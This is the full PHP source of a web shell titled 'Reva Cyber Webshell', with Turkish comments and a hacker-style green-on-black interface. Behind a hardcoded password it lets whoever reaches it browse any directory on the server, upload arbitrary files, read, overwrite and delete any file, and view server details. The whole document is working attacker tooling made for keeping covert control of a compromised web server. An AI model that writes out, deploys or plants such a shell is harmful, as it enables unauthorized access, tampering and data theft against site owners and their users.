<?php
// Güvenlik Kontrolü
$auth_pass = "h04xbabanumberone";
session_start();
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    if (isset($_POST['password']) && $_POST['password'] === $auth_pass) {
        $_SESSION['auth'] = true;
    } else {
        die('<form method="POST" style="text-align: center; margin-top: 20%;">
                <input type="password" name="password" placeholder="Enter Password" style="padding: 10px; font-family: monospace; border: 2px solid #00ff00; background-color: #000; color: #00ff00;">
                <button type="submit" style="padding: 10px 20px; border: none; background-color: #00ff00; color: #000; font-family: monospace; cursor: pointer;">Login</button>
              </form>');
    }
}

// Dizin Geçişi
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
if (!is_dir($dir)) {
    $dir = getcwd();
}
chdir($dir);
$files = scandir($dir);

// Host bilgileri
$host_info = [
    "Sunucu Adı" => $_SERVER['SERVER_NAME'],
    "IP Adresi" => $_SERVER['SERVER_ADDR'],
    "Port" => $_SERVER['SERVER_PORT'],
    "Sunucu Yazılımı" => $_SERVER['SERVER_SOFTWARE'],
    "PHP Sürümü" => PHP_VERSION,
    "Çalışma Dizin" => getcwd(),
];

// HTML Başlangıcı
echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reva Cyber Webshell</title>
    <style>
        @import url("https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap");
        body {
            font-family: "Fira Code", monospace;
            background-color: #000;
            color: #00ff00;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        a {
            color: #00ff00;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        .file, .dir {
            padding: 10px;
            margin: 5px 0;
            background-color: #101010;
            border: 1px solid #00ff00;
            border-radius: 5px;
        }
        .dir {
            font-weight: bold;
        }
        .controls {
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        button {
            padding: 10px 20px;
            background-color: #00ff00;
            border: none;
            color: #000;
            cursor: pointer;
            border-radius: 5px;
            font-family: "Fira Code", monospace;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #00cc00;
        }
        .header {
            text-align: center;
            font-size: 32px;
            margin-bottom: 20px;
            color: #ff0000;
        }
        .host-info {
            margin-top: 20px;
            background-color: #101010;
            padding: 15px;
            border-radius: 5px;
            border: 1px solid #00ff00;
        }
        .host-info p {
            margin: 5px 0;
        }
        .file-content {
            padding: 10px;
            background-color: #101010;
            border-radius: 5px;
            border: 1px solid #00ff00;
            margin-bottom: 20px;
        }
        .file-edit {
            margin-top: 20px;
            background-color: #101010;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #00ff00;
        }
        .file-edit textarea {
            width: 100%;
            height: 200px;
            background-color: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px;
            font-family: "Fira Code", monospace;
        }
    </style>
</head>
<body>
    <div class="header">
        Reva Cyber Terminal
    </div>
    <div class="container">
        <div class="controls">
            <form method="POST" enctype="multipart/form-data" style="display: inline;">
                <input type="file" name="upload" style="color: #00ff00; background: #000; border: 1px solid #00ff00; padding: 5px;">
                <button type="submit">Yükle</button>
            </form>
            <form method="GET" style="display: inline;">
                <input type="text" name="dir" placeholder="Dizin Girin" value="' . htmlspecialchars($dir) . '" style="color: #00ff00; background: #000; border: 1px solid #00ff00; padding: 5px;">
                <button type="submit">Git</button>
            </form>
        </div>
        <div class="listing">
';

// Dosya Yükleme İşlemi
if ($_FILES) {
    $uploaded_file = $_FILES['upload']['tmp_name'];
    $destination = $dir . '/' . $_FILES['upload']['name'];
    if (move_uploaded_file($uploaded_file, $destination)) {
        echo '<p>Dosya başarıyla yüklendi!</p>';
    } else {
        echo '<p>Dosya yükleme başarısız.</p>';
    }
}

// Dizin ve Dosya Listeleme
echo '<div class="dir"><a href="?dir=' . urlencode(dirname($dir)) . '">.. (\u00dct Dizin)</a></div>';
foreach ($files as $file) {
    if (is_dir($file)) {
        echo '<div class="dir"><a href="?dir=' . urlencode($dir . '/' . $file) . '">' . htmlspecialchars($file) . '</a></div>';
    } else {
        echo '<div class="file">' . htmlspecialchars($file) . ' - <a href="?dir=' . urlencode($dir) . '&file=' . urlencode($file) . '">Görütüle ve Düzenle</a></div>';
    }
}

// Dosya Görütüleme ve Düzenleme
if (isset($_GET['file'])) {
    $file_path = $dir . '/' . $_GET['file'];
    if (is_file($file_path)) {
        // Dosya içeriğini gösterme
        echo '<div class="file-content"><h3>' . htmlspecialchars($_GET['file']) . ' içeriği:</h3>';
        echo '<pre>' . htmlspecialchars(file_get_contents($file_path)) . '</pre></div>';

        // Dosya düzenleme formu
        echo '<div class="file-edit">
                <form method="POST">
                    <h4>Dosyayı Düzenle:</h4>
                    <textarea name="file_content">' . htmlspecialchars(file_get_contents($file_path)) . '</textarea>
                    <br>
                    <button type="submit" name="save_file">Kaydet</button>
                </form>
              </div>';

        // Dosya düzenleme işlemi
        if (isset($_POST['save_file'])) {
            file_put_contents($file_path, $_POST['file_content']);
            echo '<p>Dosya başarıyla kaydedildi!</p>';
        }

        // Dosya silme işlemi
        echo '<form method="POST" style="margin-top: 10px;">
                <button type="submit" name="delete_file" style="background-color: #ff4040;">Dosyayı Sil</button>
              </form>';

        if (isset($_POST['delete_file'])) {
            if (unlink($file_path)) {
                echo '<p>Dosya başarıyla silindi!</p>';
            } else {
                echo '<p>Dosya silinemedi!</p>';
            }
        }
    }
}

// Host bilgilerini görütüleme
echo '<div class="host-info">';
foreach ($host_info as $key => $value) {
    echo '<p><strong>' . $key . ':</strong> ' . $value . '</p>';
}

echo '
    </div>
</div>
</body>
</html>';
